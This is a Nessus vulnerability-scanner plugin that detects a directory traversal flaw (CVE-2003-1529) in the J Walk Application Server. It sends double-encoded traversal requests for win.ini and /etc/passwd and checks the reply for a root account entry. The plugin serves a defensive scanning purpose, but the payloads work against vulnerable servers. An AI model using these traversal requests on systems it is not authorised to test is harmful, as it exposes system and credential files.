#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11467);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2003-1529");
 script_bugtraq_id(7160);
 script_osvdb_id(4927);
 script_xref(name:"Secunia", value:"8411");
 
 script_name(english:"J Walk Application Server Encoded Directory Traversal Arbitrary File Access");
 script_summary(english:"Reads a file outside the web root");
 
 script_set_attribute( attribute:"synopsis", value:
"A web application on the remote host has a directory traversal
vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The version of J Walk running on the remote host has a directory
traversal vulnerability.  It is possible to read arbitrary files
by prepending '.%252e/.%2523' to a filename.  A remote attacker could
exploit this to read sensitive information that might be used to
mount further attacks." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2003/Mar/348"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to J Walk 3.3c4 or later."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/03/20");
 script_cvs_date("$Date: 2016/11/19 01:42:50 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

i=0;
r[i] = "/.%252e/.%252e/.%252e/.%252e/windows/win.ini";	i=i+1;
r[i] = "/.%252e/.%252e/.%252e/.%252e/winnt/win.ini";	i=i+1;


for (i=0; r[i]; i=i+1)
{
  if (check_win_dir_trav(port: port, url: r[i]))
  {
    security_warning(port);
    exit(0);
  }
}


url = "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd";
rc = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

if(egrep(pattern:"root:.*:0:[01]:", string:rc[2]))
{
  security_warning(port);
  exit(0);
}
